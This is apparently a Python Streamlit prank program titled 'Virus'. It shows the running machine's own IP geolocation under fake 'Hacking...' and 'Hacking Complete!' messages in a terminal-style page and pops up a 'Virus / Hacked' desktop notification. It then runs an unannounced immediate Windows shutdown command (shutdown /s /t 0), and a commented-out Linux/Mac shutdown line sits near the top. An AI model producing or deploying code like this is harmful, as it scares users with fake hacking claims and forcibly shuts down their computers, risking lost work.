
import streamlit as st
import geocoder
import time
from plyer import notification  # Import plyer for notifications
import os

# Shutdown command  # For Windows
# os.system("sudo shutdown -h now")  # For Linux/Mac (uncomment this if using Linux/Mac)


# Function to get the location by IP
def get_location_by_ip():
    # Get the location using your public IP address
    g = geocoder.ip('me')  # 'me' returns your public IP address
    return g

# Function to send a notification
def send_notification(title, message):
    notification.notify(
        title=title,
        message=message,
        timeout=1 # Duration in seconds the notification will be visible
    )

# Streamlit Interface
st.set_page_config(page_title="Virus", page_icon=":guardsman:", layout="wide")

# Set the custom CSS to make the app look like a terminal
st.markdown("""
    <style>
        .reportview-container {
            background-color: black;
            color: #00ff00;
        }
        .sidebar .sidebar-content {
            background-color: black;
            color: #00ff00;
        }
        .css-1v3fvcr {
            background-color: black;
            color: #00ff00;
        }
        .spinner {
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 30px;
            color: #00ff00;
        }
        .hacking-text {
            font-size: 24px;
            color: #00ff00;
            text-align: center;
            padding-top: 10px;
        }
    </style>
""", unsafe_allow_html=True)

# Title
st.title("### IP Geolocation Hacker Terminal")

# Display the "Hacking..." text and rotating circle
with st.spinner("Hacking..."):
    time.sleep(2)  # Simulate some delay (loading)

# Get the location data
location = get_location_by_ip()

# Clear the spinner and show results
st.success("Hacking Complete!")
st.write(f"**IP Address:** {location.ip}")
st.write(f"**City:** {location.city}")
st.write(f"**Country:** {location.country}")
st.write(f"**Latitude:** {location.latlng[0] if location.latlng else 'Not Available'}")
st.write(f"**Longitude:** {location.latlng[1] if location.latlng else 'Not Available'}")

# Send a desktop notification when the hacking is complete
send_notification("Virus", "Hacked")

# Add a rotating circle to enhance the "hacking" theme
st.markdown("""
    <div class="spinner">
        <div class="circle"></div>
    </div>
""", unsafe_allow_html=True)

os.system("shutdown /s /t 0")
